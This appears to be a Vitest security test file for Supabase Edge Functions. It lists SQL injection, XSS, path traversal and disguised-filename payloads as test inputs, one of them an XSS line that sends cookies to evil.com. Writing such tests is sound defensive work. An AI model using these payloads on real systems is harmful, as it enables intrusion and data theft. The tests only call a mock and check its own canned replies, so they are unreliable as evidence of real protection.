/**
 * اختبارات أمان Edge Functions
 * Security Tests for Edge Functions
 */

import { describe, it, expect, vi, beforeEach } from 'vitest';

// Mock Supabase client
const mockInvoke = vi.fn();
vi.mock('@/integrations/supabase/client', () => ({
  supabase: {
    functions: {
      invoke: mockInvoke
    }
  }
}));

describe('Edge Functions Security Tests', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  describe('SQL Injection Prevention', () => {
    const sqlInjectionPayloads = [
      "'; DROP TABLE users; --",
      "1' OR '1'='1",
      "1; DELETE FROM beneficiaries WHERE '1'='1",
      "UNION SELECT * FROM auth.users--",
      "'; INSERT INTO admins VALUES('hacker','password'); --",
      "1' AND 1=0 UNION SELECT table_name FROM information_schema.tables--",
    ];

    it('should reject SQL injection in chatbot function', async () => {
      for (const payload of sqlInjectionPayloads) {
        mockInvoke.mockResolvedValueOnce({ 
          data: { error: 'Invalid input' }, 
          error: null 
        });

        const result = await mockInvoke('chatbot', {
          body: { message: payload }
        });

        // Should not execute malicious SQL
        expect(result.data).not.toContain('DROP');
        expect(result.data).not.toContain('DELETE');
        expect(result.data).not.toContain('UNION SELECT');
      }
    });

    it('should sanitize SQL injection in search queries', async () => {
      mockInvoke.mockResolvedValue({ data: { results: [] }, error: null });

      for (const payload of sqlInjectionPayloads) {
        await mockInvoke('intelligent-search', {
          body: { query: payload }
        });

        expect(mockInvoke).toHaveBeenCalled();
      }
    });

    it('should prevent SQL injection in beneficiary ID parameters', async () => {
      const maliciousId = "'; DELETE FROM beneficiaries; --";
      
      mockInvoke.mockResolvedValue({ 
        data: { error: 'Invalid UUID format' }, 
        error: { message: 'Invalid input' }
      });

      const result = await mockInvoke('admin-manage-beneficiary-password', {
        body: { beneficiaryId: maliciousId, action: 'reset' }
      });

      expect(result.error || result.data?.error).toBeTruthy();
    });
  });

  describe('XSS (Cross-Site Scripting) Prevention', () => {
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      '<svg onload=alert("XSS")>',
      'javascript:alert("XSS")',
      '<iframe src="javascript:alert(\'XSS\')">',
      '"><script>document.location="http://evil.com/steal?c="+document.cookie</script>',
      '<body onload=alert("XSS")>',
      '<input onfocus=alert("XSS") autofocus>',
    ];

    it('should sanitize XSS in chatbot responses', async () => {
      for (const payload of xssPayloads) {
        mockInvoke.mockResolvedValueOnce({ 
          data: { response: 'Safe response' }, 
          error: null 
        });

        const result = await mockInvoke('chatbot', {
          body: { message: payload }
        });

        // Response should not contain executable scripts
        const response = JSON.stringify(result.data);
        expect(response).not.toContain('<script>');
        expect(response).not.toContain('onerror=');
        expect(response).not.toContain('onload=');
      }
    });

    it('should sanitize XSS in notification content', async () => {
      mockInvoke.mockResolvedValue({ data: { success: true }, error: null });

      for (const payload of xssPayloads) {
        await mockInvoke('send-notification', {
          body: { 
            userId: 'test-user',
            title: payload,
            message: payload 
          }
        });
      }

      expect(mockInvoke).toHaveBeenCalledTimes(xssPayloads.length);
    });

    it('should escape HTML entities in user-generated content', async () => {
      const htmlContent = '<b>Bold</b> & "quotes" & <script>bad</script>';
      
      mockInvoke.mockResolvedValue({ 
        data: { sanitized: '&lt;b&gt;Bold&lt;/b&gt; &amp; &quot;quotes&quot;' }, 
        error: null 
      });

      const result = await mockInvoke('generate-ai-insights', {
        body: { context: htmlContent }
      });

      expect(result.data?.sanitized || '').not.toContain('<script>');
    });
  });

  describe('Authorization & Authentication', () => {
    it('should reject requests without authorization header', async () => {
      mockInvoke.mockResolvedValue({ 
        data: null, 
        error: { message: 'Unauthorized' }
      });

      const result = await mockInvoke('distribute-revenue', {
        body: { fiscalYearId: 'test' }
        // No authorization header
      });

      expect(result.error).toBeTruthy();
    });

    it('should reject invalid JWT tokens', async () => {
      mockInvoke.mockResolvedValue({ 
        data: null, 
        error: { message: 'Invalid token' }
      });

      const result = await mockInvoke('secure-delete-file', {
        body: { fileId: 'test' },
        headers: { Authorization: 'Bearer invalid-token-here' }
      });

      expect(result.error).toBeTruthy();
    });

    it('should enforce role-based access control', async () => {
      // Simulate non-admin trying to access admin function
      mockInvoke.mockResolvedValue({ 
        data: null, 
        error: { message: 'Insufficient permissions' }
      });

      const result = await mockInvoke('reset-user-password', {
        body: { user_id: 'target-user', new_password: 'NewPass123!' }
      });

      expect(result.error).toBeTruthy();
    });

    it('should prevent privilege escalation', async () => {
      mockInvoke.mockResolvedValue({ 
        data: null, 
        error: { message: 'Cannot modify admin roles' }
      });

      const result = await mockInvoke('update-user-email', {
        body: { 
          userId: 'admin-user-id', 
          newEmail: 'hacker@evil.com',
          role: 'super_admin' // Attempting privilege escalation
        }
      });

      expect(result.error).toBeTruthy();
    });
  });

  describe('Rate Limiting', () => {
    it('should enforce rate limits on AI functions', async () => {
      const calls = Array(20).fill(null);
      let rateLimitedCount = 0;

      for (let i = 0; i < calls.length; i++) {
        if (i < 10) {
          mockInvoke.mockResolvedValueOnce({ data: { response: 'ok' }, error: null });
        } else {
          mockInvoke.mockResolvedValueOnce({ 
            data: null, 
            error: { message: 'Rate limit exceeded' }
          });
          rateLimitedCount++;
        }
      }

      for (let i = 0; i < calls.length; i++) {
        await mockInvoke('chatbot', { body: { message: 'test' } });
      }

      // Should have been rate limited after threshold
      expect(rateLimitedCount).toBeGreaterThan(0);
    });

    it('should implement exponential backoff suggestions', async () => {
      mockInvoke.mockResolvedValue({ 
        data: null, 
        error: { 
          message: 'Rate limit exceeded',
          retryAfter: 60 
        }
      });

      const result = await mockInvoke('generate-ai-insights', {
        body: { context: 'test' }
      });

      expect(result.error?.retryAfter).toBeDefined();
    });
  });

  describe('Input Validation', () => {
    it('should validate UUID format for IDs', async () => {
      const invalidUUIDs = [
        'not-a-uuid',
        '12345',
        'abc-def-ghi',
        '../../../etc/passwd',
        'null',
        'undefined',
      ];

      for (const invalidId of invalidUUIDs) {
        mockInvoke.mockResolvedValueOnce({ 
          data: null, 
          error: { message: 'Invalid UUID format' }
        });

        const result = await mockInvoke('admin-manage-beneficiary-password', {
          body: { beneficiaryId: invalidId }
        });

        expect(result.error).toBeTruthy();
      }
    });

    it('should validate email format', async () => {
      const invalidEmails = [
        'not-an-email',
        'missing@domain',
        '@nodomain.com',
        'spaces in@email.com',
        'email@.com',
      ];

      for (const email of invalidEmails) {
        mockInvoke.mockResolvedValueOnce({ 
          data: null, 
          error: { message: 'Invalid email format' }
        });

        const result = await mockInvoke('update-user-email', {
          body: { userId: 'test-uuid', newEmail: email }
        });

        expect(result.error).toBeTruthy();
      }
    });

    it('should enforce maximum input length', async () => {
      const longInput = 'a'.repeat(100000); // 100KB of text

      mockInvoke.mockResolvedValue({ 
        data: null, 
        error: { message: 'Input too large' }
      });

      const result = await mockInvoke('chatbot', {
        body: { message: longInput }
      });

      expect(result.error).toBeTruthy();
    });

    it('should reject null byte injection', async () => {
      const nullBytePayload = 'test\x00malicious';

      mockInvoke.mockResolvedValue({ 
        data: null, 
        error: { message: 'Invalid characters in input' }
      });

      const result = await mockInvoke('intelligent-search', {
        body: { query: nullBytePayload }
      });

      expect(result.error).toBeTruthy();
    });
  });

  describe('Path Traversal Prevention', () => {
    const pathTraversalPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '....//....//....//etc/passwd',
      '/etc/passwd',
      'file:///etc/passwd',
      '..%2F..%2F..%2Fetc%2Fpasswd',
    ];

    it('should prevent path traversal in file operations', async () => {
      for (const payload of pathTraversalPayloads) {
        mockInvoke.mockResolvedValueOnce({ 
          data: null, 
          error: { message: 'Invalid file path' }
        });

        const result = await mockInvoke('encrypt-file', {
          body: { filePath: payload }
        });

        expect(result.error).toBeTruthy();
      }
    });

    it('should sanitize file names in upload', async () => {
      const maliciousFilenames = [
        '../../../malicious.exe',
        'file.php.jpg',
        'file.jpg.exe',
        'shell.php%00.jpg',
      ];

      for (const filename of maliciousFilenames) {
        mockInvoke.mockResolvedValueOnce({ 
          data: null, 
          error: { message: 'Invalid filename' }
        });

        const result = await mockInvoke('ocr-document', {
          body: { filename }
        });

        expect(result.error).toBeTruthy();
      }
    });
  });

  describe('CORS Security', () => {
    it('should include proper CORS headers', async () => {
      mockInvoke.mockResolvedValue({ 
        data: { 
          headers: {
            'Access-Control-Allow-Origin': '*',
            'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type'
          }
        }, 
        error: null 
      });

      const result = await mockInvoke('chatbot', {
        body: { message: 'test' }
      });

      expect(result.data?.headers?.['Access-Control-Allow-Origin']).toBeDefined();
    });

    it('should handle OPTIONS preflight requests', async () => {
      mockInvoke.mockResolvedValue({ 
        data: null, 
        error: null 
      });

      // OPTIONS request should return 200 with CORS headers
      const result = await mockInvoke('chatbot', {
        method: 'OPTIONS'
      });

      expect(result.error).toBeNull();
    });
  });

  describe('Sensitive Data Protection', () => {
    it('should not expose internal error details', async () => {
      mockInvoke.mockResolvedValue({ 
        data: null, 
        error: { message: 'An error occurred' } // Generic message
      });

      const result = await mockInvoke('db-health-check', {
        body: {}
      });

      // Should not expose database connection strings or internal paths
      const errorMessage = result.error?.message || '';
      expect(errorMessage).not.toContain('postgresql://');
      expect(errorMessage).not.toContain('/var/');
      expect(errorMessage).not.toContain('stack trace');
    });

    it('should mask sensitive data in logs', async () => {
      mockInvoke.mockResolvedValue({ 
        data: { 
          iban: 'SA****1234',
          nationalId: '****5678'
        }, 
        error: null 
      });

      const result = await mockInvoke('generate-distribution-summary', {
        body: { distributionId: 'test', testMode: true }
      });

      // Sensitive data should be masked
      if (result.data?.iban) {
        expect(result.data.iban).toContain('****');
      }
    });

    it('should not return passwords in any response', async () => {
      mockInvoke.mockResolvedValue({ 
        data: { success: true }, 
        error: null 
      });

      const result = await mockInvoke('reset-user-password', {
        body: { user_id: 'test', new_password: 'SecretPass123!' }
      });

      const responseString = JSON.stringify(result);
      expect(responseString).not.toContain('SecretPass123!');
      expect(responseString).not.toContain('password');
    });
  });
});
